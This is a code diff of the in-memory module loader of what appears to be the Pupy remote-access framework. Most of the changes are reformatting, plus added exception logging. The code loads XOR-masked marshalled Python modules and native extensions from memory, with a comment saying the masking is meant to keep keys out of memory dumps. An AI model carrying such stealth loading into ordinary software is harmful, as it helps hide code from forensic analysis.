@@ -40,7 +40,7 @@ __all__ = (
 
     'config', 'modules', 'dlls', 'client', 'revision',
 
-    'namespace', 'connection', 'set_broadcast_event', 'broadcast_event',
+    'namespace', 'set_broadcast_event', 'broadcast_event',
     'obtain',
 
     'manager', 'Task', 'Manager',
@@ -318,10 +318,25 @@ def loadpy(src, dst, masked=False):
         # Poors man "obfuscation", just to reduce (a bit) amount of our
         # plaintext keys in mem dump
         content = bytearray(len(src))
-        for i,x in enumerate(src):
-            content[i] = chr(ord(x)^((2**((65535-i)%65535))%251))
+        for i, x in enumerate(src):
+            content[i] = chr(
+                ord(x) ^ ((2 ** ((65535 - i) % 65535)) % 251)
+            )
 
-    exec (marshal.loads(bytes(content)), dst)
+    try:
+        exec (marshal.loads(bytes(content)), dst)
+    except Exception as e:
+        message = str(e)
+        try:
+            import traceback
+            exception_info = str(traceback.format_exc())
+            message += '\n' + exception_info + '\nAT:\n'
+            message += ''.join(traceback.format_stack())
+        except ImportError:
+            pass
+
+        dprint("Failed call loadpy: " + message)
+        raise
 
 
 def import_module(data, initname, fullname, path):
@@ -364,7 +379,7 @@ def get_module_files(fullname):
     path = fullname.replace('.', '/')
 
     files = [
-        module for module in modules \
+        module for module in modules
         if module.rsplit('.', 1)[0] == path or any([
             (
                 path + '/__init__' + ext == module
@@ -386,7 +401,7 @@ def make_module(fullname, path=None, is_pkg=False, mod=None):
 
     if is_pkg:
         mod.__path__ = [
-            str(mod.__file__.rsplit('/',1)[0])
+            str(mod.__file__.rsplit('/', 1)[0])
         ]
         mod.__package__ = str(fullname)
     else:
@@ -461,29 +476,38 @@ class PupyPackageLoader(object):
 
             mod = None
             if extension in EXTS_SOURCES:
-                dprint('Load {} from source file ({})'.format(fullname, self.extension))
+                dprint('Load {} from source file ({})'.format(
+                    fullname, self.extension))
 
                 mod = self._make_module(fullname)
                 code = compile(self.contents, mod.__file__, 'exec')
                 exec (code, mod.__dict__)
 
             elif extension in EXTS_COMPILED:
-                dprint('Load {} from marshalled file ({})'.format(fullname, self.extension))
+                dprint('Load {} from marshalled file ({})'.format(
+                    fullname, self.extension))
 
                 try:
                     mod = self._make_module(fullname)
-                    loadpy(self.contents[8:], mod.__dict__, self.extension == 'pye')
+                    loadpy(
+                        self.contents[8:],
+                        mod.__dict__,
+                        self.extension == 'pye'
+                    )
                 except Exception as e:
-                    remote_error('Load {} failed: Exception: {}'.format(fullname, e))
+                    remote_error('Load {} failed: Exception: {}'.format(
+                        fullname, e))
                     raise
 
             elif extension in EXTS_NATIVE:
                 if not is_supported(_import_module):
-                    raise ImportError('memimporter interface is not initialized yet')
+                    raise ImportError(
+                        'memimporter interface is not initialized yet')
 
                 initname = 'init' + fullname.rsplit('.', 1)[-1]
 
-                dprint('Load {} from native file {}'.format(fullname, self.path))
+                dprint('Load {} from native file {}'.format(
+                    fullname, self.path))
 
                 self._make_module(
                     fullname,
@@ -491,13 +515,17 @@ class PupyPackageLoader(object):
                 )
 
             else:
-                raise ImportError('Unsupported extension {}'.format(self.extension))
+                raise ImportError('Unsupported extension {}'.format(
+                    self.extension))
 
         except Exception as e:
             if fullname in sys.modules:
                 del sys.modules[fullname]
 
-            remote_error('Error loading package {} ({} pkg={})', fullname, self.path, self.is_pkg)
+            remote_error(
+                'Error loading package {} ({} pkg={})',
+                fullname, self.path, self.is_pkg
+            )
             raise
 
         finally:
@@ -673,9 +701,12 @@ class PupyPackageFinder(object):
             del files[:]
 
             content = modules[selected]
-            dprint('{} found in "{}" / size = {}', fullname, selected, len(content))
+            dprint(
+                '{} found in "{}" / size = {}',
+                fullname, selected, len(content)
+            )
 
-            extension = selected.rsplit(".",1)[1].strip().lower()
+            extension = selected.rsplit(".", 1)[1].strip().lower()
             is_pkg = any([
                 selected.endswith('/__init__'+ext) for ext in (
                     EXTS_COMPILED + EXTS_SOURCES
@@ -685,7 +716,9 @@ class PupyPackageFinder(object):
             dprint('--> Loading {} ({}) package={}'.format(
                 fullname, selected, is_pkg))
 
-            return PupyPackageLoader(fullname, content, extension, is_pkg, selected)
+            return PupyPackageLoader(
+                fullname, content, extension, is_pkg, selected
+            )
 
         except Exception as e:
             dprint('--> Loading {} failed: {}/{}'.format(fullname, e, type(e)))
